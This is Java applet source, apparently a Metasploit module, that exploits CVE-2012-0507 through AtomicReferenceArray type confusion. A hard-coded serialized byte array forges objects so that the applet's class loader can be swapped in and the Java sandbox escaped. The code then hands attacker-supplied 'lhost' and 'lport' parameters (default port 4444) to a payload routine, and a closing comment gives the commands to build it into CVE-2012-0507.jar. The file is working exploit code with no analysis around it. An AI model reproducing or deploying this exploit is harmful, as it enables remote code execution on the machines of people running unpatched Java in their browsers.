package msf.x;

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.concurrent.atomic.AtomicReferenceArray;

public class Exploit extends Applet
{
	public Exploit() {}

	public void init()
	{
		try
		{
			byte[] buf = new byte[] {
				-84,-19,0,5,117,114,0,19,91,76,106,97,118,97,46,108,97,110,103,46,79,98,106,
				101,99,116,59,-112,-50,88,-97,16,115,41,108,2,0,0,120,112,0,0,0,2,117,114,0,
				13,91,76,109,115,102,46,120,46,72,101,108,112,59,-2,44,-108,17,-120,-74,-27,
				-1,2,0,0,120,112,0,0,0,1,112,115,114,0,48,106,97,118,97,46,117,116,105,108,
				46,99,111,110,99,117,114,114,101,110,116,46,97,116,111,109,105,99,46,65,116,
				111,109,105,99,82,101,102,101,114,101,110,99,101,65,114,114,97,121,-87,-46,
				-34,-95,-66,101,96,12,2,0,1,91,0,5,97,114,114,97,121,116,0,19,91,76,106,97,
				118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,120,112,113,0,126,0,3
			};

			ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(buf));
			Object aobj[] = (Object[])objectinputstream.readObject();
			Help ahelp[] = (Help[]) aobj[0];

			AtomicReferenceArray atomicreferencearray = (AtomicReferenceArray) aobj[1];
			ClassLoader classloader = getClass().getClassLoader();
			atomicreferencearray.set(0, classloader);
			Help _tmp = ahelp[0];

			String data  = getParameter( "data" );
			String jar   = getParameter( "jar" );
			String lhost = getParameter( "lhost" );
			String lport = getParameter( "lport" );	

			Help.doWork(ahelp[0], this, data, jar, lhost, ( lport == null ? 4444 : Integer.parseInt( lport ) ));
		}
		catch(Exception exception) {
			//System.out.println(exception.getMessage());
		}
	}
}

/*
javac -d bin msf/x/*.java
cd bin
jar cvf ../CVE-2012-0507.jar msf/x/*.class
*/